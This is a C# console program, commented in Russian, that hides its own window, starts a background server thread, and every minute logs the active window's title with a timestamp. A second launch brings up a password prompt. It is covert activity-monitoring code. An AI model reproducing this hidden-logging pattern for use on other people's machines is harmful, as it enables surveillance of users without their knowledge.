using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SeachActiveApp
{
    class Program
    {
        //public DateTime dtStart;        //Время запуска программы
        //public DateTime dtStop;         //Время остановки программы. Если оно есть значит программу не перезагружали экстренно
        //public Boolean blSession;  //1 в начале цикла программы, а 0 вконце цикла программы - если при запуске программы это значение равно 1 то значит цикл не закончил свою работу



        static void Main(string[] args)
        {


            string strActivApp;
            //string strActivAppOld=null;
            //DateTime dtAppOld;
            DateTime dtActiveApp;

            server www = new server();
            Thread server = new Thread(www.start);
            server.Start();

            
            if (isStillRunning()) //Если запустили второй раз то показываем форму ввода пароля
            {
                System.Diagnostics.Debug.WriteLine("второй раз");

                frmLogin login = new frmLogin();

                if (login.Visible)
                {
                    login.Focus();
                }
                else
                {
                    login.ShowDialog();
                }


            }
            else //Если запускаем первый раз, то прячемся
            {
                System.Diagnostics.Debug.WriteLine("первый раз");

                //считывание текущих значений из реестра только в момент запуска приложения и после этого используем локальную переменную
                //strActivAppOld = clReg.ReadAppParam("NameAppOld");
                //dtAppOld = Convert.ToDateTime(clReg.ReadAppParam("dtAppOld"));
                // ред. 11/11/2020  Будем использовать База для хранения данных с циклом 1 мин

                clWinAPI.HideConsoleApp(true); //Прячем программу


                while (true)
                {

                    strActivApp = clWinAPI.GetCaptionOfActiveWindow();
                    dtActiveApp = DateTime.Now;

                    new clRW(dtActiveApp, strActivApp, 1);

                    //new server(80);

                    Thread.Sleep(60000); //спим 1 мин
                }

            }

            
        }

        static bool isStillRunning()
        {
            string processName = Process.GetCurrentProcess().MainModule.ModuleName;
            ManagementObjectSearcher mos = new ManagementObjectSearcher();
            mos.Query.QueryString = @"SELECT * FROM Win32_Process WHERE Name = '" + processName + @"'";
            if (mos.Get().Count > 1)
            {
                return true;
            }
            else
                return false;
        }
    }
}
